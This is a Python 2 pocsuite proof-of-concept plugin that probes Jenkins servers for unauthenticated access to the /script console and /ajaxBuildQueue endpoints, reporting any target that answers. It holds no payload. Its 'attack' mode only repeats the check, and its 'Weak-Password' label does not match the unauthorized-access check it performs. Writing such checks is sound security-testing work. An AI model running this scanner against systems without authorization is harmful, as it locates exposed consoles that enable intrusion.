#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
Copyright (c) 2014-2015 pocsuite developers (http://seebug.org)
See the file 'docs/COPYING' for copying permission
"""
#命令行
from pocsuite import pocsuite_cli
#验证模块
from pocsuite import pocsuite_verify
#攻击模块
from pocsuite import pocsuite_attack
#控制台模式
from pocsuite import pocsuite_console
#requests 
from pocsuite.api.request import req
#register
from pocsuite.api.poc import register
#report
from pocsuite.api.poc import Output, POCBase
#url转换host
from pocsuite.lib.utils.funs import url2ip

#基础基类
class JenkinsPOC(POCBase):
    vulID = '23'  # ssvid ID 如果是提交漏洞的同时提交 PoC,则写成 0
    version = '1' #默认为1
    vulDate = '2018-05-09' #漏洞公开的时间,不知道就写今天

    author = 'xiaohuihui1' #  PoC作者的大名
    createDate = '2018-05-09'# 编写 PoC 的日期
    updateDate = '2018-05-09'# PoC 更新的时间,默认和编写时间一样
    references = 'http://www.52bug.cn/黑客技术/3905.html'# 漏洞地址来源,0day不用写
    name = 'jenkins Unauthorized access'# PoC 名称
    appPowerLink = 'https://jenkins.io/' # 漏洞厂商主页地址
    appName = 'jenkins'# 漏洞应用名称
    appVersion = 'all versions'# 漏洞影响版本
    vulType = 'Weak-Password'#漏洞类型,类型参考见 漏洞类型规范表
    desc = '''
        jenkins未授权漏洞
    ''' # 漏洞简要描述
    samples = []# 测试样列,就是用 PoC 测试成功的网站
    install_requires = [] # PoC 第三方模块依赖，请尽量不要使用第三方模块，必要时请参考《PoC第三方模块依赖说明》填写
    cvss = u"严重" #严重,高危,中危,低危

    #指纹方法
    def _fingerprint(self):
        pass
        
    #验证模块 pocsuite -r 23-jenkins-Unauthorized.py -u 1.1.1.1 --verify
    def _verify(self):
        #result是返回结果
        result = {}
        #获取漏洞url
        vul_url = '%s' % self.url

        #如果设置端口则取端口,没有设置则为默认端口
        import re
        # from pocsuite.lib.utils.funs import url2ip
        _port = re.findall(':(\d+)\s*', vul_url)
        if len(_port) != 0:
            _host = url2ip(vul_url)[0]
            _port = url2ip(vul_url)[1]
        else :
            _host = url2ip(vul_url)
            _port = "8080"

        vul_ip = "http://%s:%s" % (_host, _port)
        print vul_ip
        
        try:
            response1 = req.get(url=vul_ip+"/script",timeout=5)
            response2 = req.get(url=vul_ip+"/ajaxBuildQueue",timeout=5)
            if (response1.status_code==200 and "Jenkins.instance.pluginManager.plugins" in response1.text  and response2.status_code==200):
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = vul_ip
            else:
                response1 = req.get(url=vul_ip+"/jenkins/script",timeout=5)
                response2 = req.get(url=vul_ip+"/jenkins/ajaxBuildQueue",timeout=5)
                if (response1.status_code==200 and "Jenkins.instance.pluginManager.plugins" in response1.text  and response2.status_code==200):
                    result['VerifyInfo'] = {}
                    result['VerifyInfo']['URL'] = vul_ip
        except Exception, e:
            response = ""
        print '[+]23 poc done'
        return self.parse_output(result)

        

    #攻击模块
    def _attack(self):
         return self._verify()

    #输出报告
    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail()
        return output

#注册类
register(JenkinsPOC)